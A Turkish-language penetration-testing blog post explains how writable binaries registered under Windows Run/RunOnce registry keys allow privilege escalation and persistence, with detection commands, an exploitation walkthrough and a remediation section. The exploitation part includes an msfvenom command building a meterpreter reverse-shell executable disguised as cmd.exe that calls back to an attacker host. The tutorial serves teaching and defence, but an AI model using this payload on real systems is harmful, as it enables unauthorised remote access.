---
layout: post
title: Modifiable binaries saved as Registry AutoRun
description: "Kayıt Defterindeki Düzenlenebilir Başlangıç Uygulaması."
modified: 2020-09-03
comments: true
categories: TR
tags: [yetki yükseltme, privilege escalation, windows, pentest]
---


## Özet

Windows Kayıt Defteri (Registery), yüklü programlar ve donanımlar için bilgiler, ayarlar, seçenekler ve diğer değerleri tutar. Kayıt defterini, işletim sistemi çekirdeği, aygıt sürücüleri, hizmetler, hesap yöneticisi ve kullanıcı arabiriminin tümü kullanabilir. 

İşletim sisteminin içine bu kadar yerleşmiş bir araç kötü niyetli kullanımla işletim sisteminin işleyişinde ciddi değişikliklere yol açabilmektedir.


## Detaylı Bilgi

Windows her oturum açılışında istenen dosyaların otomatik olarak başlatılmasını sağlayan bir özelliği vardır. Bu özelliği kayıt defteri üzerinden gerçekeştirmek için Run ve RunOnce kayıtlarına, çalıştırılması istenen dosya yolu verilecek şekilde anahtar girilmelidir.
Aşağıda ki kayıtlar içerisine anahtar girilerek istenen dosyalar her oturum açılışında çaıştırılabilir.

~~~
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
~~~

Her oturum açılışında otomatik dosya çalıştırma Windows’un sağladığı bir özelliktir. Ancak yanlış yapılandırılmış ise kötü niyetli kişiler tarafından istismar edilebilir. Eğer ki sisteme erişimi olan kötü niyetli kişi, otomatik başlatılan bu dosyaları değiştirme ayrıcalıklarına sahipse ilgili dosyanın yerine kendi zararlı yazılımını yerleştirerek, zararlının her oturum açılışında çalıştırılmasını sağlayacaktır. Elde ettiği erişim de, oturum açan kullanıcının ayrıcalıklarına sahip olacaktır. Bu yöntem hem hak yükseltme yöntemi hem de sistemde kalıcı olma yöntemi olarak kullanılabilmektedir. 

## Bulunması

Masaüstünde bulunan CMD.exe uygulamasının oturum açıldığında otomatik olarak başlayacağı senaryoyu inceleyelim. Yanlış yapılandırma sonucunu otomatik olarak bulmak için DazzleUp’ı kullanabiliriz. Çıktı incelendiğinde hangi kayıt defteri anahtarı ve hangi dosya olduğu görünmektedir. DazzleUp’ın verdiği ekran görüntüsü aşağıdadır.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/1.png" alt="">
</p>

İlgili kayıt, kayıt defterinde arandığında aşağıdaki gibi gözükmektedir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/2.png" alt="">
</p>

Eğer manuel olarak test edilmesi gerekirse ilk adımda hangi uygulamaların başlangıç uygulaması olduğuna bakılmalı. Başlangıç uygulamalarının tespiti için;

~~~
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
~~~

komutları **cmd** ya da **powershell** üzerinden çalıştırılabilir. Örnek çıktı aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/3.png" alt="">
</p>

**NOT:** HKCU o an ki kullanıcıyı etkileyecektir. HKLM tüm makineyi etkileyecektir. Run her oturum açılışında çalıştırmaya devam edecek. RunOnce ise bir seferlik çalışmasını sağlayacaktır.

Bulunan başlangıç uygulamaları üzerinde değişiklik yapma izninin olup olmadığı araştırılmalıdır. Bunun için **icacls.exe** kullanılabilir. 

```powershell
icacls.exe "C:\Users\test\Desktop\cmd.exe"
```

Uygulamanın **test** kullanıcısı tarafından değiştirilebilir olduğu aşağıda ki ekran görüntüsünde gösterilmiştir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/4.png" alt="">
</p>

**NOT:** Icacls size **F** (Full), **M** (Modify), **RX** (Read and Executable), **R** (Readonly), **W** (Writeonly) kısaltılmış olmak üzere bilgi verir.
Ayrıca dosyanın **Güvenlik** ayarları da kullanılabilir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/5.png" alt="">
</p>

Bu hali ile cmd.exe dosyası test kullanıcısı tarafından değiştirilebilir olduğu için sistemde test kullanıcısı ile elde edilmiş bir oturum var ise bu dosya başka bir zararlı yazılım ile aynı isimde olacak şekilde değiştirilebilir. Bu sağlandığında her oturum açılışında tekrar bir oturum elde edilecektir. Elde edilen uzak erişim, hangi kullanıcı oturum açtı ise o kullanıcı üzerinden elde edilmiş olacaktır. Eğer Administrator kulllanıcısı ile oturum açılırsa sistemde Administrator kullanıcısı üzerinden bir uzak erişim elde edilecektir. 

## İstismar Edilmesi

Zararlı yazılım üretilerek sisteme ilgili dosyanın yerine yerleştirilecektir. Bunun için ilk adımda zararlı üretilecektir. Zararlının üretildiğine dair ekran görüntüsü aşağıda verilmiştir. 

```bash
msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.6.182 LPORT=445 -f exe -o cmd.exe
```
<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/6.png" alt="">
</p>

İlgili dosyanın hedef makineye daha önceden elde edilmiş bir oturum üzerinden yüklenmesine dair ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/7.png" alt="">
</p>

Administrator kullanıcısı oturum açtığında elde edilecek oturum Administrator kullanıcısı ayrıcalıklarında olacaktır. Böylece hak yükseltme yapılabilecektir. Eğer başka kullanıcı oturum açarsa elde edilecek oturum o kullanıcının ayrıcalıklarında olacaktır. **Administrator** kullanıcısı oturum açtığında elde edilen oturumun ekran görüntüsü aşağıdadır.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/8.png" alt="">
</p>

**NOT:** Dosya kimler tarafından çalıştırılabilir iznine sahipse sadece o kullanıcılardan erişim elde edilebilir. Örnek olarak dosya izinlerine **Everyone** eklenirse her kullanıcı bu dosyayı çalıştırabileceği için her kullanıcı oturum açtığında oturum elde edilebilir olacaktır. Everyone izinleri açıldığına dair ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/9.png" alt="">
</p>

Örneğin **user1** kullanıcısının oturum açtığında elde edilen oturum aşağıda gösterilmiştir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/10.png" alt="">
</p>

## Çözüm

Mevcut durumu gidermek için eğer başlangıçta dosyanın çalıştırılması gerekiyorsa dosya değiştirme ve çalıştırma izinlerini düzenleyebilirsiniz. Böylelikle sadece istenen kullanıcı oturum açtığında dosya çalışmış olacak.

Bir diğer yöntem ise yanlış yapılandırılmış anahtarları silmek olacaktır ancak Windows'un sağladığı bir özelliği kullanmamak olacaktır. Bunun yerine hatalı yapılandırmaları düzenlemek en mantıklısı olacaktır. Yanlış yapılandırmanın olabileceği kayıtlar;
~~~
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
~~~

içerisinde bulunabilir.
Yanlış yapılandırılmış anahtarın temizlendiğine dair ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/11.png" alt="">
</p>

Hatalı yapılandırmanın giderildiğine dair ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/12.png" alt="">
</p>

## Kaynakça:

* https://en.wikipedia.org/wiki/Windows_Registry
* https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
* https://github.com/hlldz/dazzleUP
